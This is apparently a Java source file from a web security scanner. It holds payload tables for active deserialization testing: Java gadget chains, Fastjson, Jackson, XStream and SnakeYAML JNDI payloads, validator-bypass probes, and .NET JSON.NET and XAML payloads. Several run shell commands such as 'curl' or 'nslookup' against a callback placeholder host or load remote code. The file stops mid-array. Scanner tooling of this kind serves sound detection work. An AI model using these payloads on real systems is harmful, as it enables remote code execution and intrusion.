package com.omnistrike.modules.injection;

/**
 * Active-testing deserialization payload tables, extracted verbatim from
 * {@link DeserializationScanner} to keep that class navigable. Pure data:
 * gadget-chain / object-injection payloads keyed by chain name. Package-private
 * and consumed only by DeserializationScanner.
 */
final class DeserActivePayloads {
    private DeserActivePayloads() {}

    // ==================== ACTIVE TESTING PAYLOADS ====================

    // Java gadget chain sleep payloads (Base64 encoded common chains)
    // These are marker strings — in a real deployment you'd use ysoserial output
    static final String[][] JAVA_TIME_PAYLOADS = {
            {"CommonsCollections1", "rO0ABXNyADJvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXAAAAAAAAAAAQMAAUwAB2ZhY3RvcnlO"},
            {"CommonsCollections5", "rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u"},
            {"CommonsBeanutils1", "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQAAAAAAAAAAAQMAA"},
            {"CommonsCollections6", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAA"},
            {"CommonsCollections7", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaHRhYmxlE7sPJSFK5LgDAAJGAApsb2FkRmFjdG9y"},
            {"Spring1", "rO0ABXNyAC5vcmcuc3ByaW5nZnJhbWV3b3JrLmNvcmUuU2VyaWFsaXphYmxlVHlwZVdyYXBwZXI"},
            {"Hibernate1", "rO0ABXNyAC5vcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5BYnN0cmFjdENvbXBvbmVudA"},
            {"C3P0", "rO0ABXNyACRjb20ubWNoYW5nZS52Mi5jM3AwLmltcGwuUG9vbEJhY2tlZA"},
            {"JRMPClient", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldIpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAB"},
            {"Groovy1", "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQAAAAAAAAABAQMAAUI="},
            {"ROME", "rO0ABXNyAChjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5PYmplY3RCZWFu"},
            {"BeanShell1", "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpl"},
            {"Myfaces1", "rO0ABXNyADhvcmcuYXBhY2hlLm15ZmFjZXMudmlldy5mYWNlbGV0cy5lbC5WZWF"},
            {"Jdk7u21", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldIpEhZWWuLc0AwAAeHB3DAAAAL"},
            {"Vaadin1", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3Rv"},
            {"Click1", "rO0ABXNyAC5vcmcuYXBhY2hlLmNsaWNrLmNvbnRyb2wuQ29sdW1uJENvbHVtblNvcnQ="},
    };

    // Java sub-framework active payloads — Fastjson, Jackson, XStream, SnakeYAML
    // Each framework has LDAP/DNS payloads (Burp Collaborator) AND HTTP payloads (Custom OOB compatible)
    static final String[][] JAVA_FASTJSON_PAYLOADS = {
            // LDAP-based (Burp Collaborator — requires DNS resolution)
            {"Fastjson JdbcRowSetImpl",
                    "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://COLLAB_PLACEHOLDER/a\",\"autoCommit\":true}"},
            {"Fastjson TemplatesImpl",
                    "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"PAYLOAD\"],\"_name\":\"a\",\"_tfactory\":{},\"_outputProperties\":{}}"},
            {"Fastjson BasicDataSource",
                    "{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassName\":\"com.sun.rowset.JdbcRowSetImpl\",\"url\":\"ldap://COLLAB_PLACEHOLDER/b\"}"},
            {"Fastjson JndiDataSourceFactory",
                    "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://COLLAB_PLACEHOLDER/c\"}}"},
            {"Fastjson UnixPrintService",
                    "{\"@type\":\"sun.print.UnixPrintServiceLookup\",\"defaultPrinter\":\"nslookup COLLAB_PLACEHOLDER\"}"},
            {"Fastjson 1.2.68+ expectClass",
                    "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://COLLAB_PLACEHOLDER/d\",\"autoCommit\":true}"},
            // HTTP-based (Custom OOB compatible)
            {"Fastjson LdapAttribute",
                    "{\"@type\":\"com.sun.jndi.ldap.LdapAttribute\",\"val\":{\"@type\":\"java.net.URL\",\"val\":\"http://COLLAB_PLACEHOLDER/e\"}}"},
            {"Fastjson URL",
                    "{\"@type\":\"java.net.URL\",\"val\":\"http://COLLAB_PLACEHOLDER/fastjson\"}"},
            {"Fastjson InetAddress",
                    "{\"@type\":\"java.net.InetSocketAddress\",\"address\":{\"@type\":\"java.net.InetAddress\",\"val\":\"COLLAB_PLACEHOLDER\"}}"},
            {"Fastjson JdbcRowSetImpl HTTP",
                    "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"http://COLLAB_PLACEHOLDER/fastjson3\",\"autoCommit\":true}"},
            {"Fastjson BasicDataSource HTTP",
                    "{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassName\":\"com.sun.rowset.JdbcRowSetImpl\",\"url\":\"http://COLLAB_PLACEHOLDER/fastjson4\"}"},
            {"Fastjson JndiDataSourceFactory HTTP",
                    "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"http://COLLAB_PLACEHOLDER/fastjson5\"}}"},
    };

    static final String[][] JAVA_JACKSON_PAYLOADS = {
            // ── Tier 1: Commonly known gadgets (LDAP OOB) ──────────────────────
            {"Jackson JdbcRowSetImpl",
                    "[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://COLLAB_PLACEHOLDER/a\",\"autoCommit\":true}]"},
            {"Jackson TemplatesImpl",
                    "[\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",{\"transletBytecodes\":[\"PAYLOAD\"],\"transletName\":\"a\",\"outputProperties\":{}}]"},
            {"Jackson C3P0 JndiRefFwd",
                    "[\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",{\"jndiName\":\"ldap://COLLAB_PLACEHOLDER/b\",\"loginTimeout\":0}]"},
            {"Jackson SpringPropertyPath",
                    "[\"org.springframework.beans.factory.config.PropertyPathFactoryBean\",{\"targetBeanName\":\"ldap://COLLAB_PLACEHOLDER/c\",\"propertyPath\":\"x\"}]"},
            {"Jackson LogbackJndi",
                    "[\"ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"ldap://COLLAB_PLACEHOLDER/d\"}]"},

            // ── Tier 2: Less blocklisted enterprise gadgets (LDAP OOB) ─────────
            // C3P0 WrapperConnectionPoolDataSource — bypass for JndiRefForwardingDataSource blocklist
            {"Jackson C3P0 WrapperCPDS",
                    "[\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\","
                            + "{\"userOverridesAsString\":\"HexAsciiSerializedMap:ACED0005;\"}]"},
            // XBean — Apache XBean naming context, common in Tomcat/TomEE/Karaf environments
            {"Jackson XBean",
                    "[\"org.apache.xbean.propertyeditor.JndiConverter\",{\"asText\":\"ldap://COLLAB_PLACEHOLDER/xbean\"}]"},
            // Logback DBAppender — JNDI via connection source (not on most blocklists pre-2.14)
            {"Jackson LogbackDBAppender",
                    "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\","
                            + "{\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://COLLAB_PLACEHOLDER/logback'\"}]"},
            // Caucho Resin — JNDI via Hessian provider (common in Resin-based enterprise apps)
            {"Jackson CauchoResin",
                    "[\"com.caucho.config.types.ResourceRef\","
                            + "{\"lookupName\":\"ldap://COLLAB_PLACEHOLDER/resin\"}]"},
            // HikariCP — extremely common in Spring Boot; datasource triggers JNDI lookup
            {"Jackson HikariCP",
                    "[\"com.zaxxer.hikari.HikariConfig\","
                            + "{\"metricRegistry\":\"ldap://COLLAB_PLACEHOLDER/hikari\"}]"},
            // Ibatis JndiDataSourceFactory — present in any MyBatis/Ibatis stack
            {"Jackson IbatisJndi",
                    "[\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\","
                            + "{\"properties\":{\"data_source\":\"ldap://COLLAB_PLACEHOLDER/ibatis\"}}]"},
            // LDAP Attribute — triggers URL fetch (JDK built-in, no external deps)
            {"Jackson LdapAttribute",
                    "[\"com.sun.jndi.ldap.LdapAttribute\","
                            + "{\"val\":{\"@class\":\"java.net.URL\",\"val\":\"http://COLLAB_PLACEHOLDER/ldapattr\"}}]"},
            // Spring OXM — Jaxb2Marshaller triggers URL resolution
            {"Jackson SpringOXM",
                    "[\"org.springframework.oxm.jaxb.Jaxb2Marshaller\","
                            + "{\"contextPath\":\"ldap://COLLAB_PLACEHOLDER/oxm\"}]"},
            // EHCache — JndiRmiServiceExporter, common in enterprise cache stacks
            {"Jackson EhCacheJndi",
                    "[\"net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup\","
                            + "{\"properties\":{\"jndiName\":\"ldap://COLLAB_PLACEHOLDER/ehcache\"}}]"},
            // Arrow AntiSamy — often in older CMS environments
            {"Jackson ArrowAntiSamy",
                    "[\"org.apache.arrow.vector.util.JsonStringArrayList\",[\"ldap://COLLAB_PLACEHOLDER/arrow\"]]"},

            // ── Tier 1 HTTP-based (Custom OOB compatible) ──────────────────────
            {"Jackson JdbcRowSetImpl HTTP",
                    "[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"http://COLLAB_PLACEHOLDER/jackson\",\"autoCommit\":true}]"},
            {"Jackson C3P0 JndiRefFwd HTTP",
                    "[\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",{\"jndiName\":\"http://COLLAB_PLACEHOLDER/jackson2\",\"loginTimeout\":0}]"},
            {"Jackson SpringPropertyPath HTTP",
                    "[\"org.springframework.beans.factory.config.PropertyPathFactoryBean\",{\"targetBeanName\":\"http://COLLAB_PLACEHOLDER/jackson3\",\"propertyPath\":\"x\"}]"},
            {"Jackson LogbackJndi HTTP",
                    "[\"ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"http://COLLAB_PLACEHOLDER/jackson4\"}]"},

            // ── Tier 2 HTTP-based (Custom OOB compatible) ──────────────────────
            {"Jackson XBean HTTP",
                    "[\"org.apache.xbean.propertyeditor.JndiConverter\",{\"asText\":\"http://COLLAB_PLACEHOLDER/xbean2\"}]"},
            {"Jackson HikariCP HTTP",
                    "[\"com.zaxxer.hikari.HikariConfig\","
                            + "{\"metricRegistry\":\"http://COLLAB_PLACEHOLDER/hikari2\"}]"},
            {"Jackson IbatisJndi HTTP",
                    "[\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\","
                            + "{\"properties\":{\"data_source\":\"http://COLLAB_PLACEHOLDER/ibatis2\"}}]"},
            {"Jackson CauchoResin HTTP",
                    "[\"com.caucho.config.types.ResourceRef\","
                            + "{\"lookupName\":\"http://COLLAB_PLACEHOLDER/resin2\"}]"},
    };

    // ── Jackson XML payloads (jackson-dataformat-xml with DefaultTyping) ───
    // XML equivalent of polymorphic JSON: <root class="fully.qualified.Class"><field>value</field></root>
    // Jackson XML DefaultTyping serializes type info as a "class" attribute on elements.
    static final String[][] JAVA_JACKSON_XML_PAYLOADS = {
            {"Jackson-XML JdbcRowSetImpl",
                    "<root class=\"com.sun.rowset.JdbcRowSetImpl\">"
                            + "<dataSourceName>ldap://COLLAB_PLACEHOLDER/jxml</dataSourceName>"
                            + "<autoCommit>true</autoCommit></root>"},
            {"Jackson-XML C3P0 JndiRefFwd",
                    "<root class=\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\">"
                            + "<jndiName>ldap://COLLAB_PLACEHOLDER/jxml2</jndiName>"
                            + "<loginTimeout>0</loginTimeout></root>"},
            {"Jackson-XML LogbackJndi",
                    "<root class=\"ch.qos.logback.core.db.JNDIConnectionSource\">"
                            + "<jndiLocation>ldap://COLLAB_PLACEHOLDER/jxml3</jndiLocation></root>"},
            {"Jackson-XML XBean",
                    "<root class=\"org.apache.xbean.propertyeditor.JndiConverter\">"
                            + "<asText>ldap://COLLAB_PLACEHOLDER/jxml4</asText></root>"},
            {"Jackson-XML HikariCP",
                    "<root class=\"com.zaxxer.hikari.HikariConfig\">"
                            + "<metricRegistry>ldap://COLLAB_PLACEHOLDER/jxml5</metricRegistry></root>"},
            // HTTP variants for Custom OOB
            {"Jackson-XML JdbcRowSetImpl HTTP",
                    "<root class=\"com.sun.rowset.JdbcRowSetImpl\">"
                            + "<dataSourceName>http://COLLAB_PLACEHOLDER/jxml6</dataSourceName>"
                            + "<autoCommit>true</autoCommit></root>"},
            {"Jackson-XML LogbackJndi HTTP",
                    "<root class=\"ch.qos.logback.core.db.JNDIConnectionSource\">"
                            + "<jndiLocation>http://COLLAB_PLACEHOLDER/jxml7</jndiLocation></root>"},
    };

    // ── Jackson YAML payloads (jackson-dataformat-yaml with DefaultTyping) ─
    // SnakeYAML-style tags used by Jackson YAML when DefaultTyping is active.
    static final String[][] JAVA_JACKSON_YAML_PAYLOADS = {
            {"Jackson-YAML JdbcRowSetImpl",
                    "--- !!com.sun.rowset.JdbcRowSetImpl\n"
                            + "dataSourceName: \"ldap://COLLAB_PLACEHOLDER/jyaml\"\n"
                            + "autoCommit: true"},
            {"Jackson-YAML C3P0 JndiRefFwd",
                    "--- !!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n"
                            + "jndiName: \"ldap://COLLAB_PLACEHOLDER/jyaml2\"\n"
                            + "loginTimeout: 0"},
            {"Jackson-YAML LogbackJndi",
                    "--- !!ch.qos.logback.core.db.JNDIConnectionSource\n"
                            + "jndiLocation: \"ldap://COLLAB_PLACEHOLDER/jyaml3\""},
            {"Jackson-YAML XBean",
                    "--- !!org.apache.xbean.propertyeditor.JndiConverter\n"
                            + "asText: \"ldap://COLLAB_PLACEHOLDER/jyaml4\""},
            {"Jackson-YAML HikariCP",
                    "--- !!com.zaxxer.hikari.HikariConfig\n"
                            + "metricRegistry: \"ldap://COLLAB_PLACEHOLDER/jyaml5\""},
            // HTTP variants for Custom OOB
            {"Jackson-YAML JdbcRowSetImpl HTTP",
                    "--- !!com.sun.rowset.JdbcRowSetImpl\n"
                            + "dataSourceName: \"http://COLLAB_PLACEHOLDER/jyaml6\"\n"
                            + "autoCommit: true"},
            {"Jackson-YAML LogbackJndi HTTP",
                    "--- !!ch.qos.logback.core.db.JNDIConnectionSource\n"
                            + "jndiLocation: \"http://COLLAB_PLACEHOLDER/jyaml7\""},
    };

    // ── Jackson PTV (PolymorphicTypeValidator) bypass probes ────────────────
    // These use wrapping techniques to evade simple substring/prefix-based validators.
    // If the server error mentions the inner class name or resolves the nested type,
    // the PTV is either absent or bypassable. Confirmed ONLY via OOB callback.
    static final String[][] JAVA_JACKSON_PTV_BYPASS_PAYLOADS = {
            // Nested array wrapping — type info inside array element bypasses validators checking top-level type only
            {"Jackson PTV ArrayWrap JdbcRowSet",
                    "[\"java.util.ArrayList\",[{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\","
                            + "\"dataSourceName\":\"ldap://COLLAB_PLACEHOLDER/ptv1\",\"autoCommit\":true}]]"},
            // java.lang.Object wrapper — DefaultTyping.NON_FINAL allows Object since it's non-final
            {"Jackson PTV ObjectWrap",
                    "{\"value\":[\"com.sun.rowset.JdbcRowSetImpl\","
                            + "{\"dataSourceName\":\"ldap://COLLAB_PLACEHOLDER/ptv2\",\"autoCommit\":true}]}"},
            // Natural types bypass — some PTVs allow java.lang.* and javax.* by default
            {"Jackson PTV NaturalType",
                    "[\"javax.swing.JEditorPane\",{\"page\":\"http://COLLAB_PLACEHOLDER/ptv3\"}]"},
            // Interface declared field — PTV may validate the declared type (interface) not the concrete type
            {"Jackson PTV MapWrapper",
                    "{\"@class\":\"java.util.HashMap\",\"key\":[\"com.sun.rowset.JdbcRowSetImpl\","
                            + "{\"dataSourceName\":\"ldap://COLLAB_PLACEHOLDER/ptv4\",\"autoCommit\":true}]}"},
            // Spring ClassPathXmlApplicationContext — allowed by PTVs that whitelist org.springframework.*
            {"Jackson PTV SpringCPXAC",
                    "[\"org.springframework.context.support.ClassPathXmlApplicationContext\","
                            + "{\"configLocation\":\"http://COLLAB_PLACEHOLDER/ptv5\"}]"},
    };

    // ── Classpath inference: response signatures → gadget prioritization ────
    // Maps response header/body patterns to gadget families most likely present on the target classpath.
    // This is NOT detection — it reorders payloads so the most probable gadgets are tested first,
    // reducing scan time without changing false-positive/negative rates.
    static final String[][] CLASSPATH_HINTS = {
            // Pattern (case-insensitive regex on headers+body)  →  Gadget families to prioritize
            {"X-Powered-By:\\s*Spring|spring-boot|SpringBoot|whitelabel error",
                    "SpringPropertyPath,SpringOXM,SpringCPXAC,HikariCP,LogbackJndi,LogbackDBAppender"},
            {"X-Powered-By:\\s*Servlet|Apache Tomcat|org\\.apache\\.tomcat|catalina",
                    "XBean,IbatisJndi,C3P0,JdbcRowSetImpl"},
            {"X-Powered-By:\\s*Express|X-Powered-By:\\s*Koa",
                    ""},  // Not a Java target — skip Jackson entirely
            {"Server:\\s*WildFly|JBoss|X-Powered-By:\\s*Undertow",
                    "C3P0,XBean,IbatisJndi,LogbackJndi,EhCacheJndi"},
            {"Server:\\s*Resin|X-Powered-By:\\s*Resin",
                    "CauchoResin,XBean,C3P0,JdbcRowSetImpl"},
            {"MyBatis|mybatis|ibatis|SqlSession",
                    "IbatisJndi,C3P0,JdbcRowSetImpl"},
            {"HikariPool|HikariCP|com\\.zaxxer\\.hikari",
                    "HikariCP,LogbackJndi,SpringPropertyPath"},
            {"com\\.mchange\\.v2\\.c3p0|c3p0",
                    "C3P0 JndiRefFwd,C3P0 WrapperCPDS"},
            {"logback|ch\\.qos\\.logback",
                    "LogbackJndi,LogbackDBAppender"},
            {"ehcache|net\\.sf\\.ehcache",
                    "EhCacheJndi"},
    };

    static final String[][] JAVA_XSTREAM_PAYLOADS = {
            // DNS-based (Burp Collaborator)
            {"XStream ProcessBuilder",
                    "<java.lang.ProcessBuilder><command><string>nslookup</string><string>COLLAB_PLACEHOLDER</string></command></java.lang.ProcessBuilder>"},
            {"XStream EventHandler",
                    "<dynamic-proxy><interface>java.lang.Comparable</interface>"
                            + "<handler class=\"java.beans.EventHandler\">"
                            + "<target class=\"java.lang.ProcessBuilder\">"
                            + "<command><string>nslookup</string><string>COLLAB_PLACEHOLDER</string></command>"
                            + "</target><action>start</action></handler></dynamic-proxy>"},
            {"XStream SortedSet",
                    "<sorted-set><string>foo</string>"
                            + "<dynamic-proxy><interface>java.lang.Comparable</interface>"
                            + "<handler class=\"java.beans.EventHandler\">"
                            + "<target class=\"java.lang.ProcessBuilder\">"
                            + "<command><string>nslookup</string><string>COLLAB_PLACEHOLDER</string></command>"
                            + "</target><action>start</action></handler></dynamic-proxy></sorted-set>"},
            // HTTP-based (Custom OOB compatible)
            {"XStream ProcessBuilder curl",
                    "<java.lang.ProcessBuilder><command><string>/bin/sh</string><string>-c</string><string>curl http://COLLAB_PLACEHOLDER/xstream</string></command></java.lang.ProcessBuilder>"},
            {"XStream EventHandler curl",
                    "<dynamic-proxy><interface>java.lang.Comparable</interface>"
                            + "<handler class=\"java.beans.EventHandler\">"
                            + "<target class=\"java.lang.ProcessBuilder\">"
                            + "<command><string>/bin/sh</string><string>-c</string><string>curl http://COLLAB_PLACEHOLDER/xstream2</string></command>"
                            + "</target><action>start</action></handler></dynamic-proxy>"},
            {"XStream URL",
                    "<java.net.URL><string>http://COLLAB_PLACEHOLDER/xstream3</string></java.net.URL>"},
            {"XStream ImageIO",
                    "<java.util.PriorityQueue serialization=\"custom\">"
                            + "<unserializable-parents/><java.util.PriorityQueue>"
                            + "<default><size>2</size></default><int>3</int>"
                            + "<javax.imageio.ImageIO$ContainsFilter>"
                            + "<method><class>java.lang.ProcessBuilder</class>"
                            + "<name>start</name><parameter-types/></method>"
                            + "<name>foo</name></javax.imageio.ImageIO$ContainsFilter>"
                            + "<string>foo</string></java.util.PriorityQueue></java.util.PriorityQueue>"},
    };

    static final String[][] JAVA_SNAKEYAML_PAYLOADS = {
            {"SnakeYAML ScriptEngineManager",
                    "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://COLLAB_PLACEHOLDER/yaml\"]]]]"},
            {"SnakeYAML ScriptEngineManager Alt",
                    "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://COLLAB_PLACEHOLDER/yaml2\"]]]]"},
            {"SnakeYAML JdbcRowSet",
                    "!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'ldap://COLLAB_PLACEHOLDER/yaml', autoCommit: true}"},
            {"SnakeYAML SpringPropertyPathFactory",
                    "!!org.springframework.beans.factory.config.PropertyPathFactoryBean {targetBeanName: 'ldap://COLLAB_PLACEHOLDER/yaml', propertyPath: x}"},
            {"SnakeYAML C3P0",
                    "!!com.mchange.v2.c3p0.JndiRefForwardingDataSource {jndiName: 'ldap://COLLAB_PLACEHOLDER/yaml', loginTimeout: 0}"},
    };

    // .NET deserialization payloads — error/behavior-based detection
    static final String[][] DOTNET_PAYLOADS = {
            // BinaryFormatter gadget chains (Base64 fragments that trigger deserialization errors)
            {"ObjectDataProvider", "AAEAAAD/////AQAAAAAAAAAEAQAAAA1TeXN0ZW0uU3RyaW5n"},
            {"TypeConfuseDelegate", "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0"},
            // ActivitySurrogateSelector chain (triggers via BinaryFormatter)
            {"ActivitySurrogateSelector", "AAEAAAD/////AQAAAAAAAAAEAQAAABxTeXN0ZW0uQ29sbGVjdGlvbnMuU29ydGVkTGlzdA=="},
            // WindowsIdentity chain (BinaryFormatter + ClaimsIdentity)
            {"WindowsIdentity", "AAEAAAD/////AQAAAAAAAAAEAQAAAB5NaWNyb3NvZnQuSWRlbnRpdHlNb2RlbC5DbGFpbXM="},
            // DataSet/DataTable gadget (XML-based deserialization)
            {"DataSet", "AAEAAAD/////AQAAAAAAAAAEAQAAAA9TeXN0ZW0uRGF0YS5EYXRhU2V0"},
            // PSObject chain (PowerShell)
            {"PSObject", "AAEAAAD/////AQAAAAAAAAAEAQAAABdTeXN0ZW0uTWFuYWdlbWVudC5BdXRv"},
            // ClaimsIdentity chain
            {"ClaimsIdentity", "AAEAAAD/////AQAAAAAAAAAEAQAAABpTeXN0ZW0uU2VjdXJpdHkuQ2xhaW1z"},
            // TextFormattingRunProperties (Exchange/SharePoint)
            {"TextFormattingRunProperties", "AAEAAAD/////AQAAAAAAAAAMAgAAAE1NaWNyb3NvZnQuUG93ZXJTaGVsbA=="},
            // SortedSet chain
            {"SortedSet", "AAEAAAD/////AQAAAAAAAAAEAQAAACNTY3N0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Tb3J0ZWRTZXQ="},
            // AxHostState (Windows Forms)
            {"AxHostState", "AAEAAAD/////AQAAAAAAAAAEAQAAABhTeXN0ZW0uV2luZG93cy5Gb3Jtcy5Be"},
            // SessionSecurityToken (IdentityModel)
            {"SessionSecurityToken", "AAEAAAD/////AQAAAAAAAAAEAQAAACdTeXN0ZW0uSWRlbnRpdHlNb2RlbC5Ub2tlbnMu"},
            // TypeConfuseDelegate alternative
            {"TypeConfuseDelegateAlt", "AAEAAAD/////AQAAAAAAAAAEAQAAAB5TeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9u"},
    };

    // .NET JSON payloads — for TypeNameHandling / $type attacks (JSON.NET / JavaScriptSerializer)
    static final String[][] DOTNET_JSON_PAYLOADS = {
            // ObjectDataProvider via JSON.NET $type
            {"JSON.NET ObjectDataProvider",
                    "{\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\","
                            + "\"MethodName\":\"Start\","
                            + "\"ObjectInstance\":{\"$type\":\"System.Diagnostics.Process, System\"}}"},
            // WindowsIdentity via JSON.NET
            {"JSON.NET WindowsIdentity",
                    "{\"$type\":\"System.Security.Principal.WindowsIdentity, mscorlib\","
                            + "\"System.Security.ClaimsIdentity.bootstrapContext\":\"PAYLOAD\"}"},
            // SessionViewStateHistoryItem
            {"JSON.NET SessionViewState",
                    "{\"$type\":\"System.Web.UI.MobileControls.SessionViewState+SessionViewStateHistoryItem, "
                            + "System.Web.Mobile\",\"s\":\"PAYLOAD\"}"},
            // RolePrincipal
            {"JSON.NET RolePrincipal",
                    "{\"$type\":\"System.Web.Security.RolePrincipal, System.Web\","
                            + "\"System.Security.ClaimsIdentity.bootstrapContext\":\"PAYLOAD\"}"},
            // ClaimsIdentity
            {"JSON.NET ClaimsIdentity",
                    "{\"$type\":\"System.Security.Claims.ClaimsIdentity, mscorlib\","
                            + "\"System.Security.ClaimsIdentity.bootstrapContext\":\"PAYLOAD\"}"},
            // TextFormattingRunProperties (used in Exchange/SharePoint exploits)
            {"JSON.NET TextFormattingRunProperties",
                    "{\"$type\":\"Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties, "
                            + "Microsoft.PowerShell.Editor\",\"ForegroundBrush\":\"PAYLOAD\"}"},
            // JavaScriptSerializer type resolver
            {"JavaScriptSerializer TypeResolver",
                    "{\"__type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\","
                            + "\"MethodName\":\"Start\","
                            + "\"ObjectInstance\":{\"__type\":\"System.Diagnostics.Process, System\"}}"},
            // JSON.NET Assembly.Load
            {"JSON.NET Assembly.Load",
                    "{\"$type\":\"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install\","
                            + "\"Path\":\"http://COLLAB_PLACEHOLDER/payload.dll\"}"},
            // JSON.NET XamlReader
            {"JSON.NET XamlReader",
                    "{\"$type\":\"System.Windows.Markup.XamlReader, PresentationFramework\","
                            + "\"ParseAsync\":\"<ResourceDictionary/>\"}"},
            // JSON.NET ExpandoObject
            {"JSON.NET ExpandoObject",
                    "{\"$type\":\"System.Dynamic.ExpandoObject, System.Core\","
                            + "\"test\":\"value\"}"},
            // JSON.NET Uri
            {"JSON.NET Uri",
                    "{\"$type\":\"System.Uri, System\","
                            + "\"AbsoluteUri\":\"http://COLLAB_PLACEHOLDER/uri\"}"},
            // JSON.NET FileInfo
            {"JSON.NET FileInfo",
                    "{\"$type\":\"System.IO.FileInfo, mscorlib\","
                            + "\"FileName\":\"C:\\\\Windows\\\\win.ini\"}"},
            // JSON.NET DirectoryInfo
            {"JSON.NET DirectoryInfo",
                    "{\"$type\":\"System.IO.DirectoryInfo, mscorlib\","
                            + "\"FullName\":\"C:\\\\\"}"},
            // JavaScriptSerializer DotNetNuke
            {"JavaScriptSerializer DotNetNuke",
                    "{\"__type\":\"DotNetNuke.Common.Utilities.FileSystemUtils\","
                            + "\"MethodName\":\"PullFile\"}"},
            // JSON.NET Control Gallery (LosFormatter)
            {"JSON.NET Control Gallery",
                    "{\"$type\":\"System.Web.UI.LosFormatter, System.Web\","
                            + "\"SerializeObject\":\"PAYLOAD\"}"},
    };

    // .NET XML/XAML deserialization payloads
    static final String[][] DOTNET_XML_PAYLOADS = {
            // XamlReader.Load payload — DNS (Burp Collaborator)
            {"XamlReader.Load",
                    "<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" "
                            + "xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" "
                            + "xmlns:System=\"clr-namespace:System;assembly=mscorlib\" "
                            + "xmlns:Diag=\"clr-namespace:System.Diagnostics;assembly=system\">"
                            + "<ObjectDataProvider x:Key=\"\" ObjectType=\"{x:Type Diag:Process}\" MethodName=\"Start\">"
                            + "<ObjectDataProvider.MethodParameters>"
                            + "<System:String>cmd</System:String>"
                            + "<System:String>/c nslookup COLLAB_PLACEHOLDER</System:String>"
                            + "</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>"},
            // XamlReader.Load payload — HTTP (Custom OOB compatible)
            {"XamlReader.Load curl",
                    "<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" "
                            + "xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" "
                            + "xmlns:System=\"clr-namespace:System;assembly=mscorlib\" "
                            + "xmlns:Diag=\"clr-namespace:System.Diagnostics;assembly=system\">"
                            + "<ObjectDataProvider x:Key=\"\" ObjectType=\"{x:Type Diag:Process}\" MethodName=\"Start\">"
                            + "<ObjectDataProvider.MethodParameters>"
                            + "<System:String>cmd</System:String>"
                            + "<System:String>/c curl http://COLLAB_PLACEHOLDER/xaml</System:String>"
                            + "</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>"},
            // DataContractSerializer XXE
            {"DataContractSerializer XXE",
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://COLLAB_PLACEHOLDER/xxe\">]>"
                            + "<root>&xxe;</root>"},
            // XmlSerializer type injection
            {"XmlSerializer Type",
                    "<?xml version=\"1.0\"?><root xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
                            + "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" "
                            + "xsi:type=\"System.Diagnostics.Process\"/>"},
